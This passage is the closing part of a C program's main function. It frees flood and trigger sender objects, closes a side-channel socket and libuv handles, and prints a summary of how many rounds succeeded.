    // Wait for the libuv thread to finish
    pthread_join(uv_tid, NULL);

    multi_sender_free(ctx.flood_ms);
    sender_free(ctx.trigger_sender);
    free(ctx.flood_strategies);
    // Note: multi_sender_free and sender_free already free the internal structures
    // Don't double-free ctx.flood_ms and ctx.trigger_sender

    // Print summary
    printf("\n==================== Summary ====================\n");
    printf("    Total rounds: %d\n", rounds);
    printf("    Successful rounds: %d\n", g_success_count);
    printf("    Success rate: %.2f%%\n",
           (double)g_success_count / (rounds > 0 ? rounds : 1) * 100.0);
    printf("===============================================\n");

    close(side_channel_sockfd);
    uv_signal_stop(&signal_handle);
    uv_close((uv_handle_t*)&signal_handle, NULL);  // [FIX] Properly close signal handle
    uv_loop_close(loop);

    return 0;
}
